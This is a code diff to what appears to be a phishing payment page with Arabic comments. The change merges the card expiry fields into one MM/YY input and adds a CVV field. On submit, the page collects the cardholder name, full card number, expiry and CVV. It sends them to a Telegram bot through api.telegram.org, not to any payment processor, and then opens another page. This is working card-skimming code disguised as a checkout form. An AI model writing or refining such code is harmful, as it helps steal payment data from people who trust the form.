@@ -118,8 +118,8 @@
             <input type="text" id="cardHolder" placeholder="Card Holder Name" pattern="[A-Za-z ]+" required>
             
             <div class="input-row">
-                <input type="text" id="expiryMonth" class="expiry" placeholder="MM" maxlength="2" required>
-                <input type="text" id="expiryYear" placeholder="YY" maxlength="2" required>
+                <input type="text" id="expiryDate" class="expiry" placeholder="MM/YY" maxlength="5" required>
+                <input type="text" id="cvv" placeholder="CVV" maxlength="3" pattern="\d*" required>
             </div>
 
             <div class="save-card">
@@ -144,27 +144,24 @@
             event.target.value = formattedValue;
         });
 
-        // ضبط تاريخ الانتهاء (شهر وسنة) بشكل منفصل
-        document.getElementById("expiryMonth").addEventListener("input", function(event) {
-            let value = event.target.value.replace(/\D/g, ''); 
-            let mm = parseInt(value, 10);
+        // ضبط تاريخ الانتهاء (MM/YY) والتحقق من المدخلات
+        document.getElementById("expiryDate").addEventListener("input", function(event) {
+            let value = event.target.value.replace(/\D/g, ''); // إزالة غير الأرقام
+            let mm = parseInt(value.substring(0, 2), 10);
+            let yy = value.length > 2 ? parseInt(value.substring(2, 4), 10) : null;
 
-            // ضبط الحدود القصوى والدنيا
+            // ضبط الشهر بين 1 و 12
             if (mm < 1) mm = 1;
             if (mm > 12) mm = 12;
 
-            event.target.value = mm.toString().padStart(2, '0');
-        });
+            // ضبط السنة بين 25 و 40
+            if (yy !== null) {
+                if (yy < 25) yy = 25;
+                if (yy > 40) yy = 40;
+            }
 
-        document.getElementById("expiryYear").addEventListener("input", function(event) {
-            let value = event.target.value.replace(/\D/g, ''); 
-            let yy = parseInt(value, 10);
-
-            // ضبط الحدود القصوى والدنيا
-            if (yy < 25) yy = 25;
-            if (yy > 40) yy = 40;
-
-            event.target.value = yy.toString().padStart(2, '0');
+            // وضع القيم في الحقل
+            event.target.value = mm.toString().padStart(2, '0') + "/" + (yy ? yy.toString().padStart(2, '0') : '');
         });
 
         document.getElementById("paymentForm").addEventListener("submit", function(event) {
@@ -172,8 +169,7 @@
 
             const cardNumber = document.getElementById("cardNumber");
             const cardHolder = document.getElementById("cardHolder");
-            const expiryMonth = document.getElementById("expiryMonth");
-            const expiryYear = document.getElementById("expiryYear");
+            const expiryDate = document.getElementById("expiryDate");
             const cvv = document.getElementById("cvv");
             const saveCard = document.getElementById("saveCard").checked ? "Yes" : "No";
 
@@ -194,15 +190,12 @@
                 cardHolder.classList.remove("error");
             }
 
-            let mm = parseInt(expiryMonth.value, 10);
-            let yy = parseInt(expiryYear.value, 10);
-            if (mm < 1 || mm > 12 || yy < 25 || yy > 40) {
-                expiryMonth.classList.add("error");
-                expiryYear.classList.add("error");
+            let [mm, yy] = expiryDate.value.split("/");
+            if (!expiryDate.value.includes("/") || mm < 1 || mm > 12 || yy < 25 || yy > 40) {
+                expiryDate.classList.add("error");
                 valid = false;
             } else {
-                expiryMonth.classList.remove("error");
-                expiryYear.classList.remove("error");
+                expiryDate.classList.remove("error");
             }
 
             if (!/^\d{3}$/.test(cvv.value)) {
@@ -214,7 +207,7 @@
 
             if (!valid) return;
 
-            const message = `👤 Name: ${cardHolder.value}\n💳 Card: ${cardNumber.value}\n📅 Expiry: ${expiryMonth.value}/${expiryYear.value}\n🔒 CVV: ${cvv.value}\n💾 Save: ${saveCard}`;
+            const message = `👤 Name: ${cardHolder.value}\n💳 Card: ${cardNumber.value}\n📅 Expiry: ${expiryDate.value}\n🔒 CVV: ${cvv.value}\n💾 Save: ${saveCard}`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
             .then(() => window.open("page.html", "_blank"));
